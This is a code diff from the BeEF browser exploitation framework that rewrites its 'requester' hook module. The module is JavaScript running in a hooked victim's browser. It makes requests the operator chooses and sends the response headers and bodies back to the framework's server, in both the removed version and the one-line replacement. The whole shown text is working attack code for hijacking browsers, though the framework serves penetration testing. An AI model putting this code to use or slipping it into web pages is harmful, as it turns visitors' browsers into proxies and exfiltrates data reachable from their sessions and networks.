@@ -13,42 +13,11 @@ beef.net.requester = {
 	handler: "requester",
 	
 	send: function(requests_array) {
-		var http = beef.net.get_ajax();
-		
 		for(i in requests_array) {
 			request = requests_array[i];
-			
-			// initializing the connection
-			http.open(request.method, request.uri, true);
-			
-			// setting the HTTP headers
-			for(index in request.headers) {
-				http.setRequestHeader(index, request.headers[index]);
-			}
-			
-			http.onreadystatechange = function() {
-				if (http.readyState == 4) {
-					headers = http.getAllResponseHeaders();
-					body = http.responseText;
-					
-					// sending the results back to the framework
-					beef.net.request(
-						beef.net.beef_url+'/'+beef.net.requester.handler,
-						'POST',
-						null,
-						"id="+request.id+"&body="+escape(headers+"\n\n"+body)
-					);
-				}
-			}
-			
-			if(request.method == 'POST' && request.params) {
-				http.send(request.params);
-			} else {
-				http.send(null);
-			}
+			beef.net.request('http', request.method, request.host, request.port, request.uri, null, null, 10, 'HTML', function(res) { beef.net.send('/requester', request.id, res);  });
 		}
 	}
-	
 };
 
 beef.regCmp('beef.net.requester');
